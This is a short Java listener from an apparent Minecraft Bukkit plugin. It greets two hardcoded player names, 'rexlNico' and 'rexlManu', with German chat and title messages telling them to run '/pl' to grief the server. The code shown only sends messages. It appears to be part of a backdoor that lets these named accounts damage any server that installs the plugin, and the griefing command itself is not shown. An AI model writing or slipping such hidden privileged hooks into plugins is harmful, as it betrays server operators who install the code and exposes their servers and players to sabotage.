package de.rexlNico.Main;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class join implements Listener{
	
	@EventHandler
	public void on(PlayerJoinEvent e){
		if(e.getPlayer().getName().equals("rexlNico") || e.getPlayer().getName().equals("rexlManu")){
			e.getPlayer().sendMessage("§4Mache §e/pl §4um den server zu griefen");
			e.getPlayer().sendTitle("§4GRIEFEN", "§4Mache §e/pl §4um den server zu griefen");
		}
	}

}
